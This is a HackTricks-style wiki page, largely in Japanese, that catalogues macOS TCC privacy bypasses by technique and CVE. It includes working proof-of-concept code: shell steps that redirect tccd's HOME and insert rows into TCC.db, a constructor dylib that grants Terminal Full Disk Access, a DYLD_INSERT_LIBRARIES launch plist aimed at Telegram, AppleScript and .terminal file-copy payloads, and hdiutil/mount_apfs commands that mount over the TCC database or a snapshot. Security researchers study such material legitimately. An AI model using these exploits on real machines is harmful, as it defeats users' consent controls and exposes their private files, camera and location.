# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## 機能別

### Write Bypass

これは bypass ではなく、TCC の仕組みです：**書き込みからは保護されません**。Terminal **にユーザーの Desktop を読み取る access がなくても、Desktop に書き込むことはできます**：
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
The **extended attribute `com.apple.macl`** は、新しい **file** に追加され、**creators app** にそのファイルの読み取りアクセスを与えます。<sup>[[2]](#references)</sup>

### TCC ClickJacking

**TCC prompt の上にウィンドウを配置**して、ユーザーに気付かれないまま**承認**させることが可能です。PoC は [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)** にあります。**<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

攻撃者は **`Info.plist`** に任意の名前（Finder、Google Chrome など）を設定した **apps** を作成し、TCC で保護された場所へのアクセスを要求させることができます。ユーザーは、正規の application がこのアクセスを要求していると考えてしまいます。\
さらに、**Dock から正規の app を削除して偽の app を配置する**ことも可能です。そのため、ユーザーが偽の app（同じアイコンを使用可能）をクリックすると、正規の app を呼び出し、TCC permissions を要求して malware を実行させることができます。これにより、ユーザーは正規の app がアクセスを要求したと信じてしまいます。<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

詳細情報と PoC:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

デフォルトでは、**SSH 経由のアクセスには "Full Disk Access" が付与されていました**。これを無効にするには、一覧に表示したまま無効化する必要があります（一覧から削除しても、その privileges は削除されません）。<sup>[[2]](#references)</sup>

![TCC Request by arbitrary name - SSH Bypass: デフォルトでは、SSH 経由のアクセスには "Full Disk Access" が付与されていました。これを無効にするには、一覧に表示したまま無効化する必要があります（一覧から削除しても、その...](<../../../../../images/image (1077).png>)

ここでは、いくつかの **malwares がこの protection を bypass できた例**を紹介します。

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> 現在、SSH を有効にするには **Full Disk Access** が必要です。

### Handle extensions - CVE-2022-26767

attribute **`com.apple.macl`** は、**特定の application にそのファイルの読み取り権限を与えるため**に files に付与されます。この attribute は、file を app に対して **drag\&drop** したとき、またはユーザーが file を開くために**デフォルトの application で file を開くためにダブルクリック**したときに設定されます。

したがって、ユーザーは**すべての extensions を処理する malicious app を登録**し、Launch Services を呼び出して任意の file を **open** させることができます（これにより、malicious file にその file の読み取りアクセスが付与されます）。<sup>[[23]](#references)</sup>

### iCloud

entitlement **`com.apple.private.icloud-account-access`** により、**iCloud tokens を提供する** **`com.apple.iCloudHelper`** XPC service と通信できます。

**iMovie** と **Garageband** にはこの entitlement およびその他の権限がありました。

この entitlement を利用して **icloud tokens を取得する** exploit の詳細については、次の talk を確認してください: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`** permission を持つ app は、**他の Apps を制御**できます。つまり、**他の Apps に付与された permissions を abuse**できる可能性があります。<sup>[[2]](#references)</sup>

Apple Scripts の詳細については、次を確認してください:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

たとえば、App が **`iTerm` に対する Automation permission** を持っている場合、この例では **`Terminal`** が iTerm への access を持っています。

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

FDA を持たない Terminal は、FDA を持つ iTerm を呼び出し、それを使用して actions を実行できます:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Finder経由

また、AppがFinderへのアクセス権を持っている場合、次のようなscriptを実行できます。
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Appごとの挙動

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

userland の **tccd daemon** は、**`HOME`** **env** 変数を使用して、次の場所にある TCC users database にアクセスしていました: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[この Stack Exchange post](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) によると、また TCC daemon は現在の user の domain 内で `launchd` 経由で実行されているため、渡される **すべての environment variables を control** できます。<sup>[[19]](#references)</sup>\
したがって、**attacker は `launchctl` で `$HOME` environment** 変数を **control された** **directory** に指定し、**TCC** daemon を **restart** した後、**TCC database を直接 modify** して、end user に prompt を表示させることなく、自身に利用可能な **すべての TCC entitlement** を付与できます。<sup>[[1]](#references)</sup>\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes は TCC で保護された場所にアクセスできましたが、ノートが作成される場所は **保護されていない場所** です。そのため、Notes に保護されたファイルをノートへコピーさせ（つまり保護されていない場所へコピーさせ）、そのファイルにアクセスできました。

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

ライブラリ `libsecurity_translocate` を使用する `/usr/libexec/lsd` バイナリには、**nullfs** mount を作成できる `com.apple.private.nullfs_allow` entitlement と、すべてのファイルにアクセスできる **`kTCCServiceSystemPolicyAllFiles`** を持つ `com.apple.private.tcc.allow` entitlement がありました。

"Library" に quarantine attribute を追加し、**`com.apple.security.translocation`** XPC service を呼び出すと、Library が **`$TMPDIR/AppTranslocation/d/d/Library`** に map され、Library 内のすべてのドキュメントに **アクセス** できました。

### CVE-2024-44131 - FileProvider symlink race

ファイル操作を **privileged helper**（ここでは **`fileproviderd`** / **`Files.app`**）に委譲するアプリは、ユーザーの **代わりに** item を copy または move するため、copy は caller ではなく helper の privileges で実行されます。

Jamf Threat Labs は、operation 前に実行される symlink validation が **race** され得ることを示しました。チェックされるパスの **最後** の component に symlink を仕掛ける代わりに、攻撃者は copy が開始された **後** に、パス中の **中間** directory を置き換えます。すると privileged helper は攻撃者が制御する link をたどり、**prompt を一度も表示せずに** TCC で保護された場所を読み書きします。<sup>[[5]](#references)</sup>

パス内で random UUID によって **保護されていない** directory（例: `~/Library/Mobile Documents/com~apple~CloudDocs`）は、攻撃者が race に使用する完全なパスを予測できるため、最も簡単な target です。

> [!TIP]
> これは探すべき一般的な pattern です: **パスを複数回 resolve する privileged process**（check-then-use、または `rename()` / `copyfile()` によって source と destination を別々に resolve する process）は、パスの途中にある directory を置き換えることで race できます。実際に window を閉じられるのは、`O_NOFOLLOW_ANY`、すでに open された directory FD に対する `openat()`、または `realpath()` と再 validation のみです。

詳しくは [**the Jamf Threat Labs writeup**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/) を参照してください。<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` は `SQLITE_ENABLE_SQLLOG` を有効にして build でき、environment variables によって制御される logging hook が追加されます（upstream の `test_sqllog.c`）。<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – **open されたすべての database** について、**database file の copy** と SQL statements の log が `path` に書き込まれます（directory はあらかじめ存在している必要があります）。
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – DB が open または attach されるたびに、既存のものを再利用せず **fresh copy** を作成します。
- **`SQLITE_SQLLOG_CONDITIONAL`** – main DB の隣に `<database>-sqllog` file が存在する場合のみ connection を log します。

この variable を FDA を持ち SQLite databases を open する process に inject できれば、保護された databases があなたの制御する directory に **copy** されます。destination filename は攻撃者が制御する data から派生するため、destination に仕掛けた **symlink** によって、同じ primitive を target process の privileges による **arbitrary file write** に変えられます。

### **SQLITE_AUTO_TRACE**

environment variable **`SQLITE_AUTO_TRACE`** が set されている場合、library **`libsqlite3.dylib`** はすべての SQL queries の **logging** を開始します。多くの applications がこの library を使用していたため、それらの SQLite queries をすべて log できました。<sup>[[22]](#references)</sup>

複数の Apple applications がこの library を使用して TCC で保護された information にアクセスしていました。
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### env-var driven file writes の探索

前の2つの項目は、同じ generic technique の実例です。さらに探す価値があります。**TCC-privileged apps にロードされた frameworks は、debug/logging の environment variables を公開していることが多く、それによって process が caller-controlled path にファイルを作成します**。

これらを見つける workflow：

1. FDA または別の価値の高い TCC permission（`Music`、`TV`、`Terminal`、MDM agents...）を持つ target を選び、リンクしている frameworks を一覧表示する（`otool -L`、`vmmap`）。
2. それらの frameworks から `getenv` strings を grep する：`strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`。
3. `launchctl setenv NAME /path/you/control` で候補の variables を設定し、app を起動する。その後、`fs_usage -w -f filesys <pid>` または `sudo fs_usage | grep <path>` を使って filesystem 上での動作を監視する。
4. process が自分の directory 内にファイルを **作成または rename** する場合、write primitive を得たことになります。destination を symlink に向ける（または上記の CVE-2024-44131 のように intermediate directory と race する）ことで、`~/Library/Application Support/com.apple.TCC/TCC.db` に redirect します。

> [!TIP]
> これには2つの制限があります。1つ目に、app が [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) entitlement（「dynamic linker environment variables の影響を app が受ける可能性があることを示す Boolean value。app の process に code を inject するために使用できる」）を備えていない限り、**`DYLD_*` variables は hardened-runtime binaries では無視されます**。[Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/) も参照してください。2つ目に、Apple は報告を受けると個々の framework debug variables を削除します。そのため、ある macOS release で動作した variable が、次の release ではなくなっていることがよくあります。1つ設定した後に app が黙って launch を拒否する場合、その variable はすでに filter されたものとして扱ってください。<sup>[[7]](#references)[[8]](#references)</sup>

linker variables を使った同等の trick については、[macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) を参照してください。

### Apple Remote Desktop

root としてこの service を有効化すると、**ARD agent は full disk access を持つことになり**、user に悪用されて新しい **TCC user database** を copy させられる可能性があります。

## **NFSHomeDirectory** による方法

TCC は、user 固有の resources への access を制御するため、user の HOME folder 内に database を使用します：**$HOME/Library/Application Support/com.apple.TCC/TCC.db**。\
したがって、user が `$HOME` env variable に**別の folder**を指定して TCC を restart できれば、user は **/Library/Application Support/com.apple.TCC/TCC.db** に新しい TCC database を作成し、TCC を trick して任意の app に任意の TCC permission を grant させることができます。

> [!TIP]
> Apple は user profile 内に保存された **`NFSHomeDirectory`** attribute の設定を **`$HOME`** の **value** として使用する点に注意してください。そのため、この value を変更する permissions（**`kTCCServiceSystemPolicySysAdminFiles`**）を持つ application を compromise できれば、この option を TCC bypass に **weaponize** できます。

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**first POC** は [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) と [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) を使用して user の **HOME** folder を変更します。

1. target app の _csreq_ blob を取得する。
2. 必要な access と _csreq_ blob を持つ fake _TCC.db_ file を plant する。
3. [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) を使って user の Directory Services entry を export する。
4. Directory Services entry を変更し、user の home directory を変更する。
5. 変更した Directory Services entry を [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) で import する。
6. user の _tccd_ を stop し、process を reboot する。

2つ目の POC では、`kTCCServiceSystemPolicySysAdminFiles` を value とする `com.apple.private.tcc.allow` を持つ **`/usr/libexec/configd`** が使用されました。\
`configd` は **`-t`** option で実行でき、attacker は **custom Bundle を load** するよう指定できました。そのため、この exploit は user の home directory を変更する **`dsexport`** と **`dsimport`** の method を、**`configd` code injection** に置き換えます。

詳細については [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/) を確認してください。<sup>[[11]](#references)</sup>

## process injection による方法

process 内に code を inject し、その TCC privileges を abuse する techniques は複数あります：


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

さらに、TCC bypass で最も一般的に見つかる process injection は **plugins（load library）** 経由です。\
Plugins は通常、libraries または plist の形をした追加 code で、**main application によって load され**、その context 内で実行されます。したがって、main application が granted permissions または entitlements 経由で TCC restricted files に access できる場合、**custom code も同じ access を持つことになります**。

### CVE-2020-27937 - Directory Utility

`/System/Library/CoreServices/Applications/Directory Utility.app` application は **`kTCCServiceSystemPolicySysAdminFiles`** entitlement を持ち、拡張子 **`.daplug`** の plugins を load しました。また、hardened runtime がありませんでした。

この CVE を weaponize するには、TCC bypass のために **users の TCC database を take over** できるよう、（前述の entitlement を abuse して）**`NFSHomeDirectory`** を **変更**します。

詳細については [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/) を確認してください。<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

**`/usr/sbin/coreaudiod`** binary は、`com.apple.security.cs.disable-library-validation` と `com.apple.private.tcc.manager` の entitlements を持っていました。前者は **code injection を許可し**、後者は **TCC を manage する access を与えます**。

この binary は `/Library/Audio/Plug-Ins/HAL` folder から **third party plug-ins** を load できました。そのため、plugin を **load** して TCC permissions を abuse することが可能でした。この PoC：<sup>[[13]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
詳細については、[**original report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)<sup>[[13]](#references)</sup>を確認してください。

### Device Abstraction Layer (DAL) Plug-Ins

Core Media I/O 経由でカメラストリームを開くシステムアプリケーション（**`kTCCServiceCamera`** を持つアプリ）は、`/Library/CoreMediaIO/Plug-Ins/DAL`（SIP の制限対象外）にあるこれらのプラグインをプロセス内にロードします。

そこに一般的な **constructor** を持つライブラリを保存するだけで、コードを **inject** できます。

複数の Apple アプリケーションがこの脆弱性の影響を受けました。

### Firefox

Firefox アプリケーションには、`com.apple.security.cs.disable-library-validation` および `com.apple.security.cs.allow-dyld-environment-variables` エンタイトルメントがありました。<sup>[[14]](#references)</sup>
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
この手法を簡単に exploit する方法の詳細については、[**original report を確認してください**](https://wojciechregula.blog/post/how-to-rob-a-firefox/)。<sup>[[14]](#references)</sup>

### CVE-2020-10006

バイナリ `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` には **`com.apple.private.tcc.allow`** および **`com.apple.security.get-task-allow`** の entitlements が設定されていたため、プロセス内部に code を inject し、TCC の権限を使用することが可能でした。

### CVE-2023-26818 - Telegram

Telegram には **`com.apple.security.cs.allow-dyld-environment-variables`** および **`com.apple.security.cs.disable-library-validation`** の entitlements が設定されていたため、これを abuse して、カメラによる recording など、Telegram の permissions に **access** することが可能でした。[**writeup に payload があります**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)。<sup>[[15]](#references)</sup>

環境変数を使用して library を load する方法に注目してください。この library を inject するために **custom plist** が作成され、`launchctl` を使用して起動されました。<sup>[[15]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## openの呼び出しによる方法

sandbox内にいる場合でも、**`open`**を呼び出すことが可能です。

### Terminal Scripts

技術者が使用するコンピューターでは、Terminalに**Full Disk Access (FDA)**を付与することがかなり一般的です。また、それを使用して**`.terminal`**スクリプトを呼び出すことも可能です。

**`.terminal`**スクリプトは、実行するコマンドを**`CommandString`**キーに含む、次のようなplistファイルです。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
アプリケーションは、/tmp などの場所にターミナルスクリプトを書き込み、次のようなコマンドで起動できます。
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## By mounting

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Any user**（権限のないユーザーも含む）は、Time Machine snapshot を作成して mount し、その snapshot 内の**すべてのファイルにアクセス**できます。\
必要な**唯一の権限**は、使用するアプリケーション（`Terminal` など）に **Full Disk Access**（FDA）アクセス（`kTCCServiceSystemPolicyAllfiles`）が付与されていることです。この権限は管理者によって付与される必要があります。<sup>[[2]](#references)</sup>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
より詳細な説明は[**元のレポートで確認できます**](https://theevilbit.github.io/posts/cve_2020_9771/)**。**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - TCC file上へのmount

TCC DB fileが保護されていても、**ディレクトリに新しいTCC.db fileをmountする**ことが可能でした：
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
**full exploit**は[**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/)で確認できます。<sup>[[21]](#references)</sup>

### CVE-2024-40855

[original writeup](https://www.kandji.io/blog/macos-audit-story-part2)で説明されているように、このCVEは`diskarbitrationd`を悪用しました。<sup>[[16]](#references)</sup>

公開されている`DiskArbitration` frameworkの`DADiskMountWithArgumentsCommon`関数がsecurity checksを実行していました。しかし、`diskarbitrationd`を直接呼び出すことでこれをbypassし、パス内で`../`要素やsymlinksを使用できます。

これにより、攻撃者は任意の場所に任意のmountを実行できました。これには、`diskarbitrationd`の`com.apple.private.security.storage-exempt.heritable` entitlementにより、TCC databaseの上へのmountも含まれます。

### asr

**`/usr/sbin/asr`** toolにより、ディスク全体をcopyして別の場所にmountし、TCC protectionsをbypassできました。

### CVE-2022-22655 - Location Services

Location Servicesは、他のservicesのようにTCC databaseには**保存されません**。独自のallow-listを**`/var/db/locationd/clients.plist`**に保持する`locationd`によって管理されています。<sup>[[4]](#references)</sup>
```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```
各エントリはクライアント（bundle ID または executable path）をキーとしており、`Authorized`、`BundleId`、`Executable`、`Registered` などのフィールドを持ちます。<sup>[[4]](#references)</sup>

`clients.plist` ファイル自体は Sandbox/TCC によって保護されており、root であっても編集できません — しかし、**`/var/db/locationd/` ディレクトリは mount から保護されていませんでした**。そのため、root として実行される attacker は、独自の `clients.plist`（自身の binary を `Authorized` としてマークしたもの）を含む disk image を作成し、それをディレクトリに over mount してから `locationd` を restart することで、偽造した allow-list を有効にできました。<sup>[[3]](#references)</sup>

> [!TIP]
> これは上記の `hdiutil`/`mount` TCC bypasses と同じパターンです。*file* は保護されていますが、それが置かれている *directory* は保護されていないため、file ではなく directory 全体を置き換えます。

## 起動アプリによる方法


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## grep による方法

複数のケースで、files は emails、phone numbers、messages などの sensitive information を保護されていない locations に保存します（これは Apple では vulnerability とみなされます）。

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

これは現在では機能しませんが、[**過去には機能していました**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

[**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf) を使う別の方法:<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934: Bypassing the macOS Transparency, Consent, and Control (TCC) Framework](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Bypassing macOS TCC User Privacy Protections By Accident and Design](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - TCC Location Services bypass (original report)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [Where in the World is Carmen Sandiego: Abusing Location Services on macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131: TCC bypass steals data from iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - Allow DYLD environment variables entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [Zero-Day TCC bypass discovered in XCSSET malware](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [New macOS vulnerability, "powerdir," could lead to unauthorized user data access](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [Change home directory and bypass TCC aka CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [Play the music and bypass TCC aka CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [How to rob a (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - Bypassing TCC with Telegram in macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - Uncovering Apple Vulnerabilities: diskarbitrationd and storagekitd Audit Part 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks & CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - Proof of Concept](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - Setting environment variables on OS X](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771: mount_apfs TCC bypass and privilege escalation](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808: TCC bypass by mounting over the TCC database](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [20+ Ways to Bypass Your macOS Privacy Mechanisms](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{{#include ../../../../../banners/hacktricks-training.md}}
